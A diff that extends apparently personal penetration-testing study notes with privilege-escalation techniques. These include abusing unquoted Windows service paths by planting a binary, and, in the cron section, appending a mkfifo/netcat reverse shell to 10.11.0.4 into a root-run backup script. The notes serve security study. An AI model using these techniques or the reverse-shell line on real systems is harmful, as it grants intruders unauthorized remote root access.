@@ -55,6 +55,7 @@ ss -anp
 iptables
 iptables-save
 iptables-restore
+grep -Hs iptables /etc/* - as regular user
 ls -lah /etc/cron*
 cat /etc/crontab
 grep "CRON" /var/log/cron.log
@@ -150,11 +151,27 @@ shutdown /r /t 0
 
 net localgroup administrators
 
+#### unquoted service paths
+
+```
+wmic service get displayname,pathname
+
+place adduser.exe in 
+
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+
+we could name our executable Program.exe and place it in C:\, or name it My.exe and place it in C:\Program Files. However, this would require some unlikely write permissions since standard users do not have write access to these directories by default.
+It is more likely that the software’s main directory (C:\Program Files\My Program in our example) or subdirectory (C:\Program Files\My Program\My service) is misconfigured, allowing us to plant a malicious My.exe binary.
+
 ```
 
 ### USBPcap
 
 ```
+
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 
 driverquery /v
@@ -163,9 +180,32 @@ C:\Program Files\USBPcap> type USBPcap.inf
 
 mingw-w64.bat
 
+C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1> mingw-w64.bat
+C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1>echo off Microsoft Windows [Version 10.0.10240]
+(c) 2015 Microsoft Corporation. All rights reserved.
+C:\> gcc
+gcc: fatal error: no input files compilation terminated.
+C:\> gcc --help
+Usage: gcc [options] file...
+
 gcc
 
 gcc --help
+
+```
+# Cron
+
+```
+grep "CRON" /var/log/cron.log
+
+student@debian:/var/scripts$ echo >> user_backups.sh 
+student@debian:/var/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
+2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh 
+student@debian:/var/scripts$ cat user_backups.sh
+#!/bin/bash
+cp -rf /home/student/ /var/backups/student/
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
+
 
 ```
 
